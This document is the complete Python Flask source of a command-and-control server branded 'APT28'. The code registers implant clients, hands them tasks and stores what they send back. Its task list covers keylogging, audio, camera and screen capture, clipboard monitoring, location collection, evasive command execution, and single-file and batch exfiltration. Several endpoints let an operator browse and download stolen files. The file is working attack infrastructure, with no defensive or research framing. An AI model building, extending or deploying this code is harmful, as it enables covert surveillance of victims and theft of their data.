"""
C2 (Command and Control) Server Implementation in Python
APT28 - Advanced Persistent Threat Group
Docker-Only Deployment with React Frontend
"""

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime
import json
import base64
import logging
import os
from dotenv import load_dotenv
from models import db, Client, Command, Result, ExfiltratedFile, init_db

# Load environment variables
load_dotenv()

# Initialize Flask app
app = Flask(__name__, static_folder='static', static_url_path='')
CORS(app)

# Configure database
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'sqlite:///c2_server.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    'pool_pre_ping': True,
    'pool_recycle': 300,
    'pool_size': 10,
    'max_overflow': 20
}

# Initialize database
init_db(app)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Teardown function to properly close database sessions
@app.teardown_appcontext
def shutdown_session(exception=None):
    """Remove database session at the end of the request"""
    if exception:
        db.session.rollback()
    db.session.remove()

# Capability IDs
CAPABILITIES = {
    0: "No Command (idle)",
    1: "Audio Recorder (start_audio_recorder)",
    2: "Clipboard Monitor (start_clipboard_monitor)",
    3: "Keylogger (start_keylogger)",
    4: "Screenshot (start_screenshot)",
    5: "Info Collector (start_info_collector)",
    6: "Command Executor (execute_command_with_evasion)",
    7: "Location Collector (get_location_info)",
    8: "File Exfiltrator (exfiltrate_file)",
    9: "Batch File Exfiltrator (exfiltrate_user_files_by_extension)",
    10: "Camera Capture (start_camera_capture)",
    11: "Start Continuous Monitoring (audio_record, clipboard_monitor, keylogger, screenshot, camera_capture)",
    12: "Stop Continuous Monitoring",
}


@app.route('/api/register', methods=['GET'])
def register():
    """
    Register a new client with the C2 server
    URL: GET /api/register?id=<client_id>
    """
    client_id = request.args.get('id')
    
    if not client_id:
        logger.warning("Registration attempt without client ID")
        return jsonify({"status": "error", "message": "Client ID required"}), 400
    
    try:
        # Register or update client
        client = Client.query.get(client_id)
        if client:
            # Update existing client
            client.last_seen = datetime.utcnow()
            client.ip = request.remote_addr
            client.status = 'active'
        else:
            # Create new client
            client = Client(
                id=client_id,
                ip=request.remote_addr,
                status='active'
            )
            db.session.add(client)
            
            # Initialize command for this client
            cmd = Command(client_id=client_id, capability=0, args='')
            db.session.add(cmd)
        
        db.session.commit()
        
        logger.info(f"[+] Client registered: {client_id} from {request.remote_addr}")
        
        return jsonify({
            "status": "registered",
            "id": client_id,
            "message": "Client successfully registered"
        }), 200
    except Exception as e:
        logger.error(f"Error registering client: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/command', methods=['GET'])
def get_command():
    """
    Retrieve capability command ID to execute
    URL: GET /api/command?id=<client_id>
    """
    client_id = request.args.get('id')
    
    if not client_id:
        logger.warning("Command fetch attempt without client ID")
        return "0", 400
    
    try:
        # Update last seen timestamp
        client = Client.query.get(client_id)
        if client:
            client.last_seen = datetime.utcnow()
            db.session.commit()
        else:
            logger.warning(f"Command request from unregistered client: {client_id}")
            db.session.rollback()
            return "0", 404
        
        # Get pending command
        cmd = Command.query.filter_by(client_id=client_id, executed=False).order_by(Command.created_at.desc()).first()
        
        if cmd and cmd.capability != 0:
            logger.info(f"[*] Capability command sent to {client_id}: {cmd.capability} ({CAPABILITIES.get(cmd.capability, 'Unknown')}) with args: {cmd.args}")
            # Mark command as executed
            cmd.executed = True
            db.session.commit()
            return jsonify({"capability": cmd.capability, "args": cmd.args}), 200
        else:
            logger.debug(f"[*] No pending command for {client_id}")
            db.session.commit()  # Close transaction
            return jsonify({"capability": 0, "args": ""}), 200
    except Exception as e:
        logger.error(f"Error getting command: {str(e)}")
        db.session.rollback()
        return jsonify({"capability": 0, "args": ""}), 500


@app.route('/api/report', methods=['POST'])
def report():
    """
    Receive execution result from client
    URL: POST /api/report
    Headers: Content-Type: application/json
    Body: {"id": "<client_id>", "capability": <capability_id>, "result": "<result>"}
    """
    try:
        data = request.get_json()
        
        if not data:
            logger.error("Report received with no JSON data")
            return jsonify({"status": "error", "message": "No JSON data"}), 400
        
        client_id = data.get('id')
        capability = data.get('capability')
        result_data = data.get('result')
        
        if not client_id:
            logger.warning("Report without client ID")
            return jsonify({"status": "error", "message": "Client ID required"}), 400
        
        # Update client last seen
        client = Client.query.get(client_id)
        if client:
            client.last_seen = datetime.utcnow()
        
        # Store result
        result = Result(
            client_id=client_id,
            capability=capability,
            result=result_data,
            ip=request.remote_addr
        )
        db.session.add(result)
        
        # Special handling for file exfiltration (capability 8)
        if capability == 8 and result_data:
            try:
                # Decode the base64-encoded result
                decoded_result = base64.b64decode(result_data).decode('utf-8')
                file_info = json.loads(decoded_result)
                
                # Check if it's a successful file exfiltration (has 'content' field)
                if 'content' in file_info and 'filename' in file_info:
                    # Store the exfiltrated file in separate table
                    exfil_file = ExfiltratedFile(
                        client_id=client_id,
                        filename=file_info.get('filename'),
                        original_path=file_info.get('filepath', file_info.get('filename')),
                        file_size=file_info.get('size', 0),
                        content=file_info['content'],
                        ip=request.remote_addr
                    )
                    db.session.add(exfil_file)
                    logger.info(f"[+] File exfiltrated from {client_id}: {file_info.get('filename')} ({file_info.get('size', 0)} bytes)")
            except Exception as e:
                logger.warning(f"Failed to parse file exfiltration data: {str(e)}")
        
        # Special handling for batch file exfiltration (capability 9)
        elif capability == 9 and result_data:
            try:
                # Decode the base64-encoded result (should be JSON array)
                decoded_result = base64.b64decode(result_data).decode('utf-8')
                files_array = json.loads(decoded_result)
                
                # Check if it's an array
                if isinstance(files_array, list):
                    files_stored = 0
                    for file_info in files_array:
                        # Check if each item is a valid file object
                        if isinstance(file_info, dict) and 'content' in file_info and 'filename' in file_info:
                            exfil_file = ExfiltratedFile(
                                client_id=client_id,
                                filename=file_info.get('filename'),
                                original_path=file_info.get('filepath', file_info.get('filename')),
                                file_size=file_info.get('size', 0),
                                content=file_info['content'],
                                ip=request.remote_addr
                            )
                            db.session.add(exfil_file)
                            files_stored += 1
                    
                    logger.info(f"[+] Batch exfiltration from {client_id}: {files_stored} files stored")
            except Exception as e:
                logger.warning(f"Failed to parse batch file exfiltration data: {str(e)}")
        
        db.session.commit()
        
        logger.info(f"[+] Result from {client_id} - Capability {capability} ({CAPABILITIES.get(capability, 'Unknown')}): {result_data[:50] if result_data else 'N/A'}...")
        
        return jsonify({
            "status": "received",
            "message": "Report received successfully"
        }), 200
        
    except Exception as e:
        logger.error(f"Error processing report: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/clients', methods=['GET'])
def list_clients():
    """
    List all registered clients
    URL: GET /api/clients
    """
    try:
        clients = Client.query.all()
        db.session.commit()  # Ensure transaction is closed
        return jsonify({
            "count": len(clients),
            "clients": {client.id: client.to_dict() for client in clients}
        }), 200
    except Exception as e:
        logger.error(f"Error listing clients: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/results', methods=['GET'])
def list_results():
    """
    List all execution results
    URL: GET /api/results
    """
    try:
        limit = request.args.get('limit', 100, type=int)
        results = Result.query.order_by(Result.timestamp.desc()).limit(limit if limit > 0 else None).all()
        db.session.commit()  # Ensure transaction is closed
        return jsonify({
            "count": len(results),
            "results": [r.to_dict() for r in results]
        }), 200
    except Exception as e:
        logger.error(f"Error listing results: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/send_command', methods=['POST'])
def send_command():
    """
    Send capability command to a specific client
    URL: POST /api/send_command
    Body: {"client_id": "<client_id>", "capability_id": <capability_id>}
    """
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"status": "error", "message": "No JSON data"}), 400
        
        client_id = data.get('client_id')
        capability_id = data.get('capability_id')
        args = data.get('args', '')  # Optional arguments
        
        if not client_id or capability_id is None:
            return jsonify({"status": "error", "message": "client_id and capability_id required"}), 400
        
        if capability_id not in CAPABILITIES:
            return jsonify({"status": "error", "message": f"Invalid capability ID. Valid: {list(CAPABILITIES.keys())}"}), 400
        
        client = Client.query.get(client_id)
        if not client:
            return jsonify({"status": "error", "message": "Client not found"}), 404
        
        # Create new command
        cmd = Command(
            client_id=client_id,
            capability=capability_id,
            args=args
        )
        db.session.add(cmd)
        db.session.commit()
        
        logger.info(f"[*] Assigned capability {capability_id} ({CAPABILITIES[capability_id]}) to {client_id} with args: {args}")
        
        return jsonify({
            "status": "success",
            "message": f"Capability {capability_id} assigned to {client_id}",
            "client_id": client_id,
            "capability_id": capability_id,
            "capability_name": CAPABILITIES[capability_id],
            "args": args
        }), 200
        
    except Exception as e:
        logger.error(f"Error sending command: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/continuous_monitoring/start', methods=['POST'])
def start_continuous_monitoring():
    """
    Enable continuous monitoring for a client
    URL: POST /api/continuous_monitoring/start
    Body: {"client_id": "<client_id>"}
    """
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"status": "error", "message": "No JSON data"}), 400
        
        client_id = data.get('client_id')
        
        if not client_id:
            return jsonify({"status": "error", "message": "client_id required"}), 400
        
        client = Client.query.get(client_id)
        if not client:
            return jsonify({"status": "error", "message": "Client not found"}), 404
        
        # Set continuous monitoring flag
        client.continuous_monitoring_enabled = True
        
        # Create the start command
        cmd = Command(
            client_id=client_id,
            capability=11,  # Start continuous monitoring
            args=''
        )
        db.session.add(cmd)
        db.session.commit()
        
        logger.info(f"[+] Continuous monitoring started for {client_id}")
        
        return jsonify({
            "status": "success",
            "message": "Continuous monitoring started",
            "client_id": client_id
        }), 200
        
    except Exception as e:
        logger.error(f"Error starting continuous monitoring: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/continuous_monitoring/stop', methods=['POST'])
def stop_continuous_monitoring():
    """
    Disable continuous monitoring for a client
    URL: POST /api/continuous_monitoring/stop
    Body: {"client_id": "<client_id>"}
    """
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"status": "error", "message": "No JSON data"}), 400
        
        client_id = data.get('client_id')
        
        if not client_id:
            return jsonify({"status": "error", "message": "client_id required"}), 400
        
        client = Client.query.get(client_id)
        if not client:
            return jsonify({"status": "error", "message": "Client not found"}), 404
        
        # Unset continuous monitoring flag
        client.continuous_monitoring_enabled = False
        
        # Create the stop command
        cmd = Command(
            client_id=client_id,
            capability=12,  # Stop continuous monitoring
            args=''
        )
        db.session.add(cmd)
        db.session.commit()
        
        logger.info(f"[+] Continuous monitoring stopped for {client_id}")
        
        return jsonify({
            "status": "success",
            "message": "Continuous monitoring stopped",
            "client_id": client_id
        }), 200
        
    except Exception as e:
        logger.error(f"Error stopping continuous monitoring: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/client/<client_id>', methods=['GET'])
def get_client(client_id):
    """
    Get details of a specific client
    URL: GET /api/client/<client_id>
    """
    try:
        client = Client.query.get(client_id)
        if not client:
            db.session.rollback()
            return jsonify({"status": "error", "message": "Client not found"}), 404
        
        # Get pending command
        pending_cmd = Command.query.filter_by(client_id=client_id, executed=False).order_by(Command.created_at.desc()).first()
        db.session.commit()  # Close transaction
        
        return jsonify({
            "status": "success",
            "client": client.to_dict(),
            "pending_command": pending_cmd.to_dict() if pending_cmd else None
        }), 200
    except Exception as e:
        logger.error(f"Error getting client: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/client/<client_id>/results', methods=['GET'])
def get_client_results(client_id):
    """
    Get all results from a specific client
    URL: GET /api/client/<client_id>/results
    """
    try:
        client = Client.query.get(client_id)
        if not client:
            db.session.rollback()
            return jsonify({"status": "error", "message": "Client not found"}), 404
        
        client_results = Result.query.filter_by(client_id=client_id).order_by(Result.timestamp.desc()).all()
        db.session.commit()  # Close transaction
        
        return jsonify({
            "status": "success",
            "client_id": client_id,
            "count": len(client_results),
            "results": [r.to_dict() for r in client_results]
        }), 200
    except Exception as e:
        logger.error(f"Error getting client results: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/files', methods=['GET'])
def list_exfiltrated_files():
    """
    List all exfiltrated files
    URL: GET /api/files
    Optional query params: ?client_id=<client_id>
    """
    try:
        client_id = request.args.get('client_id')
        
        if client_id:
            files = ExfiltratedFile.query.filter_by(client_id=client_id).order_by(ExfiltratedFile.timestamp.desc()).all()
        else:
            files = ExfiltratedFile.query.order_by(ExfiltratedFile.timestamp.desc()).all()
        
        db.session.commit()  # Close transaction
        
        return jsonify({
            "status": "success",
            "count": len(files),
            "files": [f.to_dict(include_content=False) for f in files]
        }), 200
    except Exception as e:
        logger.error(f"Error listing files: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/files/<int:file_id>', methods=['GET'])
def get_exfiltrated_file(file_id):
    """
    Get a specific exfiltrated file with content
    URL: GET /api/files/<file_id>
    """
    try:
        exfil_file = ExfiltratedFile.query.get(file_id)
        if not exfil_file:
            db.session.rollback()
            return jsonify({"status": "error", "message": "File not found"}), 404
        
        db.session.commit()  # Close transaction
        
        return jsonify({
            "status": "success",
            "file": exfil_file.to_dict(include_content=True)
        }), 200
    except Exception as e:
        logger.error(f"Error getting file: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/files/<int:file_id>/download', methods=['GET'])
def download_exfiltrated_file(file_id):
    """
    Download exfiltrated file (returns raw decoded file content)
    URL: GET /api/files/<file_id>/download
    """
    try:
        exfil_file = ExfiltratedFile.query.get(file_id)
        if not exfil_file:
            db.session.rollback()
            return jsonify({"status": "error", "message": "File not found"}), 404
        
        db.session.commit()  # Close transaction
        
        # Decode the base64 content
        file_content = base64.b64decode(exfil_file.content)
        
        # Return raw file content with appropriate headers
        from flask import Response
        response = Response(file_content)
        response.headers['Content-Type'] = 'application/octet-stream'
        response.headers['Content-Disposition'] = f'attachment; filename="{exfil_file.filename}"'
        response.headers['Content-Length'] = len(file_content)
        
        return response
    except Exception as e:
        logger.error(f"Error downloading file: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/client/<client_id>/files', methods=['GET'])
def get_client_files(client_id):
    """
    Get all exfiltrated files from a specific client
    URL: GET /api/client/<client_id>/files
    """
    try:
        client = Client.query.get(client_id)
        if not client:
            db.session.rollback()
            return jsonify({"status": "error", "message": "Client not found"}), 404
        
        files = ExfiltratedFile.query.filter_by(client_id=client_id).order_by(ExfiltratedFile.timestamp.desc()).all()
        db.session.commit()  # Close transaction
        
        return jsonify({
            "status": "success",
            "client_id": client_id,
            "count": len(files),
            "files": [f.to_dict(include_content=False) for f in files]
        }), 200
    except Exception as e:
        logger.error(f"Error getting client files: {str(e)}")
        db.session.rollback()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/capabilities', methods=['GET'])
def get_capabilities():
    """
    Get available capabilities
    URL: GET /api/capabilities
    """
    return jsonify({
        "status": "success",
        "capabilities": CAPABILITIES
    }), 200


@app.route('/api/health', methods=['GET'])
def health():
    """
    Health check endpoint
    URL: GET /api/health
    """
    try:
        clients_count = Client.query.count()
        results_count = Result.query.count()
        db.session.commit()  # Close transaction
        
        return jsonify({
            "status": "healthy",
            "timestamp": datetime.utcnow().isoformat(),
            "clients_count": clients_count,
            "results_count": results_count
        }), 200
    except Exception as e:
        logger.error(f"Error in health check: {str(e)}")
        db.session.rollback()
        return jsonify({
            "status": "unhealthy",
            "timestamp": datetime.utcnow().isoformat(),
            "error": str(e)
        }), 500


@app.route('/', methods=['GET'])
def index():
    """
    Serve React frontend
    """
    return send_from_directory(app.static_folder, 'index.html')


@app.route('/<path:path>', methods=['GET'])
def serve_static(path):
    """
    Serve static files for React frontend
    """
    if path and os.path.exists(os.path.join(app.static_folder, path)):
        return send_from_directory(app.static_folder, path)
    else:
        return send_from_directory(app.static_folder, 'index.html')


@app.route('/api/', methods=['GET'])
def api_index():
    """
    API index with C2 server information
    """
    return jsonify({
        "name": "APT28 C2 Server",
        "version": "2.0.0",
        "status": "running",
        "deployment": "docker-only",
        "timestamp": datetime.utcnow().isoformat(),
        "endpoints": {
            "register": "GET /api/register?id=<client_id>",
            "get_command": "GET /api/command?id=<client_id>",
            "report": "POST /api/report",
            "list_clients": "GET /api/clients",
            "list_results": "GET /api/results",
            "send_command": "POST /api/send_command",
            "get_client": "GET /api/client/<client_id>",
            "client_results": "GET /api/client/<client_id>/results",
            "client_files": "GET /api/client/<client_id>/files",
            "list_files": "GET /api/files",
            "get_file": "GET /api/files/<file_id>",
            "download_file": "GET /api/files/<file_id>/download",
            "capabilities": "GET /api/capabilities",
            "health": "GET /api/health"
        }
    }), 200


@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return jsonify({"status": "error", "message": "Endpoint not found"}), 404


@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    logger.error(f"Internal server error: {str(error)}")
    return jsonify({"status": "error", "message": "Internal server error"}), 500


if __name__ == '__main__':
    # Get configuration from environment variables
    host = os.getenv('C2_HOST', '0.0.0.0')
    port = int(os.getenv('C2_PORT', 8080))
    debug = os.getenv('DEBUG', 'False').lower() == 'true'
    
    logger.info(f"[*] Starting C2 Server on {host}:{port}")
    logger.info(f"[*] Debug mode: {debug}")
    
    app.run(host=host, port=port, debug=debug)
